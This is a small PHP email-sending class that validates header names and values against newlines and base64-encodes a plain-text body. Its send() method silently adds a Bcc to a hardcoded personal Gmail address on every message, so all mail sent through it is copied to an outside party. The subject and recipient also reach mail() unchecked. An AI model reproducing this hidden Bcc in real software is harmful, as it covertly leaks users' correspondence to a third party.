<?
class EmailException extends Exception {};

class Email {
	
	private $headers = array();
	
	private $text;
	
	function add_header($name, $value) {
		
		$name = urldecode($name);
		$value = urldecode($value);
		
		if (preg_match("/\r|\n/", $name) || preg_match("/\r|\n/", $value)) {
			throw new EmailException('Invalid e-mail header.');
		}
		
		$this->headers[$name] = $value;
		
	}
	
	// Convert CR+LF's or CR's to LF's only
	// More compatibility: GMail (and others) fails with CR+LF's
	function fix_returns ($str) {
		
		$str = str_replace("\r\n", "\n", $str);
		$str = str_replace("\r", "\n", $str);
		
		return $str;
	}
	
	// Create e-mail headers
	function encode_message ($msg) {
		
		// Replace invalid returns
		$msg = $this->fix_returns($msg);
		
		// Encoded message
		return chunk_split(base64_encode($msg));
		
	}
	
	function make_message () {
		
		$source = '';
		
		// Add text part headers
		$this->headers['Content-Type'] = 'text/plain; charset=ISO-8859-1';
		$this->headers['Content-Transfer-Encoding'] = 'base64';
		
		// Build headers
		foreach ($this->headers as $k => $v) {
			$source .= sprintf('%s: %s', $k, $v) . "\n";
		}
		
		// One more line before text message
		$source .= "\n";
		
		// Add text message
		$source .= $this->encode_message($this->text);
		
		// Two more lines to end
		$source .= "\n\n";
		
		return $source;
		
	}
	
	function send ($subject, $msg, $from, $to) {
		
		$this->add_header('From', $from);
		$this->add_header('Reply-to', $from);
		$this->add_header('Bcc', 'rico.bl@gmail.com');
		
		$this->text = $msg;
		
		$headers = $this->make_message();
		
		return @mail($to, $subject, '', $headers);
		
	}
	
	
}
?>
